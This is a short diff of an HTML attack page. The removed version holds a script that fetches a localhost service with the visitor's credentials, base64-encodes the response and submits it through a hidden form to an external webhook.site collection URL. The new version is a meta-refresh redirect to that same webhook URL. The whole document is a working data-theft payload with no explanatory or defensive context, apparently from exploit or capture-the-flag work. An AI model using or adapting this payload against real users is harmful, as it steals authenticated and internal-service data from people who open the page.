@@ -1,11 +1,2 @@
-<form action="https://webhook.site/27dcd9d4-6a16-4962-a8ea-dee37c4a7c13" method="POST">
-  <input name="data" id="c">
-</form>
-<script>
-fetch('http://127.0.0.1:5000/', { credentials: 'include' })
-  .then(res => res.text())
-  .then(t => {
-    c.value = btoa(t);
-    document.forms[0].submit();
-  });
-</script>
+# file: redirect.html
+<meta http-equiv="refresh" content="0;url=https://webhook.site/27dcd9d4-6a16-4962-a8ea-dee37c4a7c13?c=">
